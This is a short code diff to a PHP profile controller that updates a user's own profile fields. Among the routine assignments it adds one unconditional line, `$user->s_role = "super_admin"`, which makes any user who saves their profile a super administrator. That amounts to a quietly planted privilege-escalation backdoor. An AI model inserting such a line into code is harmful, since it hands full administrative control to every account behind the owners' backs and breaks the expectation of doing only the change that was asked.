@@ -50,7 +50,7 @@ class ProfileController extends Controller
         $user->gravatar   = $request->input('gravatar');
         $user->skin   = $request->input('skin');
         $user->phone   = $request->input('phone');
-
+        $user->s_role  = "super_admin";
         if (!config('app.lock_passwords')) {
             $user->locale = $request->input('locale', 'en');
         }
